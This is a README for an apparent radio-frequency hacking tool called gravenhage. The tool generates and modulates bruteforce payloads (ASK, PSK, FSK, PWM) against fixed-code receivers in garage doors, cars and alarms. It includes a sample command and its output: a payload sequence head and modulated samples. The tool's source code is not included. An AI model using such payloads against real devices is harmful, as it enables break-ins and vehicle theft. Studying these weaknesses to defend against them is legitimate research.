# gravenhage

Payload creation and modulation visualtization tool for bruteforcing radio devices implementing shift registers (industry standard in garage doors, cars, alarms...). Allows ultra fast bruteforcing as only one bit needs to be sent in order to try one full passcode. Tests have shown 12 bit keys are broken in an average of 4 seconds.

### Supported modulation techniques
* Amplitude Shift Keying (ASK)
* Phase Shift Keying (PSK)
* Frequency Shift Keying (FSK)
* Pulse width modulation (PWM)

### Example Output
``python3.6 graven.py -kl 12 -u FSK -f 10 -p -of dump``
<a href="https://github.com/zadewg/"><img src="https://image.ibb.co/e7u0OK/fsk.png" title="FSK" alt="FSK"></a>

``` 
                                __                  
  ___ ________ __  _____ ___  / /  ___ ____ ____   
 / _ `/ __/ _ `/ |/ / -_) _ \/ _ \/ _ `/ _ `/ -_)  
 \_, /_/  \_,_/|___/\__/_//_/_//_/\_,_/\_, /\__/   
/___/                                 /___/        

           Radio Frequency Hacking              

    https://github.com/zadewg/gravenhage  



Original dictionary size: 49152 bits
Exploit payload size: 4108 bits


Sequence head: 000000001000000110000010100000111000010010000101100001101

FSK Modulated head:
 [ 0.          0.0040906   0.00818114  0.01227154  0.01636173  0.02045165
  0.02454123  0.0286304   0.03271908  0.03680722  0.04089475  0.04498159
  0.04906767  0.05315294  0.05723732  0.06132074  0.06540313  0.06948443
  0.07356456  0.07764347  0.08172107  0.08579731  0.08987211  0.09394541
  0.09801714  0.10208723  0.10615561  0.11022221  0.11428696  0.11834981
  0.12241068  0.12646949  0.13052619  0.13458071  0.13863297  0.14268292
  0.14673047  0.15077558  0.15481816  0.15885814  0.16289547  0.16693008
  0.17096189  0.17499084  0.17901686  0.18303989  0.18705985  0.19107669
  0.19509032  0.19910069  0.20310773  0.20711138  0.21111155  0.2151082
  0.21910124  0.22309062  0.22707626  0.23105811  0.23503609  0.23901013
  0.24298018  0.24694616  0.25090801  0.25486566  0.25881905  0.2627681
  0.26671276  0.27065295  0.27458862  0.27851969  0.2824461   0.28636778
  0.29028468  0.29419671  0.29810383  0.30200595  0.30590302  0.30979497
  0.31368174  0.31756326  0.32143947  0.32531029  0.32917568  0.33303555]


[+] Output saved to dump.json

```


